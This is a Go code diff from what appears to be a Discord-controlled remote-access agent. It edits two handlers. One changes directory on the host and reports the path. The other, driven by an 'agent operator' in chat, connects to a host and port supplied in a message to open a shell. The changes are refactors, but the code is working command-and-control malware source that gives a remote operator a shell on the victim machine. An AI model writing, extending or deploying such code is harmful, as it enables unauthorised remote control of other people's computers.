@@ -30,16 +30,29 @@ import (
 func HandleDirectoryChange(message *BotMessage) {
 	// Parse the directory to move into.
 	commandBreakdown := strings.Fields(message.Message.Content)
-	destDirectory := commandBreakdown[1]
 
 	if len(commandBreakdown) == 2 {
+		destDirectory := commandBreakdown[1]
+
+		// User wants to check the current directory.
+		if destDirectory == "." {
+			// Simply send the current directories location.
+			go message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Current location** ```%s```", system.CurrentDirectory))
+
+			// We don't need to change directory now as the agent operator was just getting the current location.
+			return
+		}
+
 		// Change into the supplied directory.
 		if err := os.Chdir(destDirectory); err != nil {
 			// Error encountered when changing into the directory.
 			go message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Failed to change into directory** ```%s```", destDirectory))
 		} else {
+			// Update the current directory.
+			system.CurrentDirectory = system.GetCurrentDirectory()
+
 			// Successfully changed into the passed directory.
-			go message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Successfully changed directory** ```%s```", destDirectory))
+			go message.Session.ChannelMessageSend(message.Message.ChannelID, fmt.Sprintf("**Successfully changed directory** ```%s```", system.CurrentDirectory))
 		}
 	} else {
 		// Invalid cd command syntax.
@@ -48,14 +61,18 @@ func HandleDirectoryChange(message *BotMessage) {
 }
 
 func HandleShellConnection(message *BotMessage) {
+	// Parse the field of the host to connect to.
 	splitCommand := strings.Fields(message.Message.Content)
+
 	if len(splitCommand) == 3 {
 		go func() {
-			// Attempt to connect to the supplied server.
-			if client, err := system.Connect(system.Server{ // Returns ClientSocket containing connection to server.
+			serverToConnect := system.Server{ // Returns ClientSocket containing connection to server.
 				Host: splitCommand[1],
 				Port: splitCommand[2],
-			}); err != nil {
+			}
+
+			// Attempt to connect to the supplied server.
+			if client, err := system.Connect(serverToConnect); err != nil {
 				go message.Session.ChannelMessageSend(message.Message.ChannelID, "**Failed to connect to the shell server (timeout)**")
 			} else {
 				go message.Session.ChannelMessageSend(message.Message.ChannelID, "**Successfully connected to the shell server**")
